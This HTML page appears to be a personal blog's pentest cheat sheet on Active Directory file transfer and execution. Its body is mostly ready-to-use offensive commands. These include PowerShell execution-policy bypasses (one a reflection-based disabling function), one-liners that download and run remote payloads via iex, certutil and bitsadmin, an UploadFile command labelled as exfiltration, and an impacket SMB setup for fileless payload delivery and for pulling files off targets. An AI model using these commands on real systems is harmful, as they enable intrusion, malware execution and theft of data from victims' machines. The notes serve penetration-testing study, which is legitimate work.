<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AD File Transfer & Execution | J Laratro</title>
    <link rel="stylesheet" href="../../css/main.css">
    <link rel="stylesheet" href="../../css/effects.css">
    <link rel="stylesheet" href="../../css/pages.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        .blog-post-content { max-width: 900px; margin: 0 auto; }
        .blog-post-header { margin-bottom: 2rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border-color); }
        .blog-post-title { font-family: var(--font-display); font-size: 2rem; color: var(--text-primary); margin-bottom: 1rem; }
        .blog-post-meta { display: flex; gap: 2rem; flex-wrap: wrap; font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-muted); }
        .blog-post-body { font-size: 1rem; line-height: 1.8; color: var(--text-secondary); }
        .blog-post-body h2 { font-family: var(--font-display); font-size: 1.5rem; color: var(--accent-blue); margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border-color); }
        .blog-post-body h3 { font-family: var(--font-display); font-size: 1.2rem; color: var(--text-primary); margin: 2rem 0 1rem; }
        .blog-post-body h4 { font-family: var(--font-display); font-size: 1rem; color: var(--accent-green); margin: 1.5rem 0 0.75rem; }
        .blog-post-body p { margin-bottom: 1rem; }
        .blog-post-body pre { background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 1rem 0 1.5rem; font-family: var(--font-mono); font-size: 0.85rem; line-height: 1.5; }
        .blog-post-body code { background: var(--bg-tertiary); padding: 0.2rem 0.4rem; border-radius: 3px; font-family: var(--font-mono); font-size: 0.9em; color: var(--accent-green); }
        .blog-post-body pre code { background: transparent; padding: 0; }
        .blog-post-body ul, .blog-post-body ol { margin: 1rem 0 1.5rem 1.5rem; }
        .blog-post-body li { margin-bottom: 0.5rem; }
        .blog-post-body a { color: var(--accent-blue); text-decoration: none; }
        .blog-post-body a:hover { text-decoration: underline; }
        .blog-tags { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 1rem; }
        .blog-tag { font-family: var(--font-mono); font-size: 0.75rem; padding: 0.3rem 0.6rem; background: var(--bg-tertiary); border: 1px solid var(--border-color); border-radius: 4px; color: var(--accent-blue); }
        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; font-family: var(--font-mono); font-size: 0.9rem; color: var(--text-muted); text-decoration: none; margin-bottom: 2rem; transition: var(--transition-normal); }
        .back-link:hover { color: var(--accent-blue); }
        .technique-card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; }
        .technique-card h3 { margin-top: 0; color: var(--accent-red); }
        .resource-list { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; }
        .resource-list h4 { color: var(--accent-blue); margin-top: 0; }
    </style>
</head>
<body>
    <!-- CRT Effect -->
    <div class="crt"></div>

    <!-- Grid Background -->
    <div class="grid-bg"></div>

    <!-- Classification Bar -->
    <div class="class-bar"></div>

    <!-- Tactical Frame -->
    <div class="tactical-frame"></div>
    <div class="tactical-frame-bottom"></div>

    <!-- Navigation -->
    <nav class="cyber-nav">
        <div class="nav-container">
            <div style="display: flex; align-items: center;">
                <a href="../../index.html" class="nav-logo">
                    <span class="logo-bracket">[</span>
                    <span class="logo-text">JL</span>
                    <span class="logo-bracket">]</span>
                </a>
                <span class="logo-tag">CYBER OPS</span>
            </div>
            <div class="nav-links">
                <a href="../../index.html" class="nav-link">./home</a>
                <a href="../about.html" class="nav-link">./whoami</a>
                <a href="../cyber-projects.html" class="nav-link">./cyberops</a>
                <a href="../projects.html" class="nav-link">./research</a>
                <a href="../blog.html" class="nav-link active">./intel</a>
                <a href="../contact.html" class="nav-link">./comms</a>
            </div>
            <button class="nav-toggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="page-content">
        <div class="blog-post-content">
            <a href="../blog.html" class="back-link">&larr; Back to Blog</a>

            <article>
                <header class="blog-post-header">
                    <h1 class="blog-post-title">AD Exploitation: File Transfer and Execution</h1>
                    <div class="blog-post-meta">
                        <span>Type: Technical Notes</span>
                        <span>Category: Active Directory</span>
                    </div>
                    <div class="blog-tags">
                        <span class="blog-tag">File Transfer</span>
                        <span class="blog-tag">PowerShell</span>
                        <span class="blog-tag">SMB</span>
                        <span class="blog-tag">Exfiltration</span>
                        <span class="blog-tag">Windows</span>
                    </div>
                </header>

                <div class="blog-post-body">
                    <h2>PowerShell File Download & Execution</h2>
                    <p>Binary or script execution via PowerShell is crucial to exploitation of AD environments, as is the ability to transfer files to the target machine.</p>

                    <h4>Check Execution Policy:</h4>
                    <pre><code>Get-ExecutionPolicy</code></pre>

                    <h4>Enable PowerShell with Bypass:</h4>
                    <pre><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1</code></pre>

                    <div class="technique-card">
                        <h3>PowerShell Invoke Commands</h3>
                        <pre><code>Get-Content .file_to_execute.ps1 | Invoke-Expression

GC .file_to_execute.ps1 | iex

PowerShell.exe -ExecutionPolicy Bypass -File .file_to_execute.ps1

PowerShell.exe -ExecutionPolicy UnRestricted -File .file_to_execute.ps1

Set-ExecutionPolicy Bypass -Scope Process

Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted</code></pre>

                        <h4>Disable Execution Policy via Function:</h4>
                        <pre><code>function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .file_to_execute.ps1</code></pre>
                    </div>

                    <div class="technique-card">
                        <h3>Bypassing Policy via Piping</h3>
                        <pre><code>Echo Write-Host "script" | PowerShell.exe -noprofile -

Get-Content .file_to_execute.ps1 | PowerShell.exe -noprofile -</code></pre>

                        <h4>Using type (Windows equivalent of cat):</h4>
                        <pre><code>type .runme.ps1 | PowerShell.exe -noprofile -</code></pre>
                    </div>

                    <div class="technique-card">
                        <h3>Download and Execute from Remote Server</h3>
                        <pre><code>powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://ip/payload.ps1')"

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ip/payload.exe', 'payload.exe')</code></pre>

                        <h4>Upload/Exfiltration:</h4>
                        <pre><code>powershell (New-Object System.Net.WebClient).UploadFile('http://ip/file_to_extract.txt', 'file_to_extract.txt')</code></pre>

                        <h4>Combined Method:</h4>
                        <pre><code>powershell -executionpolicy bypass IEX(New-Object Net.WebClient).downloadString('http://ip/payload.ps1')</code></pre>
                    </div>

                    <h2>Other Native Windows Methods</h2>

                    <h3>certutil.exe</h3>
                    <pre><code>certutil.exe -urlcache -split -f http://ip/payload.exe payload.exe</code></pre>

                    <h3>bitsadmin.exe</h3>
                    <pre><code>bitsadmin.exe /transfer mydownloadjob /download /priority high http://ip/payload.exe payload.exe</code></pre>

                    <h2>SMB File Transfer</h2>
                    <p>SMB is an extremely useful method of file transfer for both Windows and Linux targets. One of the strongest advantages of SMB is the ability to run payloads without the files ever touching the disk while also not using HTTP methods of download, which may be blocked or heavily filtered.</p>

                    <div class="technique-card">
                        <h3>Impacket SMB Server</h3>
                        <h4>Start SMB Server:</h4>
                        <pre><code>impacket-smbserver share_name $(pwd) -smb2support -user username -password password</code></pre>

                        <h4>Connect from Target (PowerShell/Evil-WinRM):</h4>
                        <pre><code>$pass = convertto-securestring 'password' -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential('username', $pass);
New-PSDrive -Name username -PSProvider FileSystem -Credential $cred -Root \\ip\share_name;</code></pre>

                        <h4>List Share Contents:</h4>
                        <pre><code>dir \\ip\share_name</code></pre>

                        <h4>Download File from Share:</h4>
                        <pre><code>copy \\ip\share_name\file_to_extract.txt file_to_extract.txt</code></pre>

                        <h4>Upload File to Share:</h4>
                        <pre><code>copy file_to_extract.txt \\ip\share_name\file_to_extract.txt</code></pre>
                    </div>

                    <h2>Other Methods</h2>
                    <ul>
                        <li>ftp</li>
                        <li>tftp</li>
                        <li>mshta</li>
                        <li>rundll32</li>
                        <li>php</li>
                        <li>socat</li>
                        <li>netcat</li>
                    </ul>

                    <div class="resource-list">
                        <h4>Useful Resources</h4>
                        <ul>
                            <li><a href="https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/" target="_blank">Windows Oneliners to Download Remote Payload</a></li>
                            <li><a href="https://github.com/milkdevil/UltimateAppLockerByPassList" target="_blank">Ultimate AppLocker Bypass List</a></li>
                            <li><a href="https://github.com/740i/pentest-notes/blob/master/filetransfers.md" target="_blank">Pentest Notes - File Transfers</a></li>
                            <li><a href="https://guide.offsecnewbie.com/transferring-files" target="_blank">OffSec Newbie - Transferring Files</a></li>
                            <li><a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/file-transfer" target="_blank">PPN - File Transfer</a></li>
                            <li><a href="https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65" target="_blank">Almost All the Ways to File Transfer</a></li>
                            <li><a href="https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/" target="_blank">File Transfer Cheatsheet</a></li>
                            <li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration" target="_blank">HackTricks - Exfiltration</a></li>
                        </ul>
                    </div>

                </div>
            </article>
        </div>
    </main>

    <!-- Footer -->
    <footer class="cyber-footer">
        <div class="footer-content">
            <div class="footer-status">
                <span class="footer-dot"></span>
                <span>SYSTEMS ONLINE</span>
            </div>
            <div class="footer-links">
                <a href="https://github.com/jeremylaratro" target="_blank" class="footer-link">[GitHub]</a>
                <a href="https://www.linkedin.com/in/JeremyLaratro" target="_blank" class="footer-link">[LinkedIn]</a>
            </div>
            <div class="footer-copy">
                &copy; <span id="year"></span> // Secure Channel
            </div>
        </div>
    </footer>

    <script src="../../js/main.js"></script>
</body>
</html>
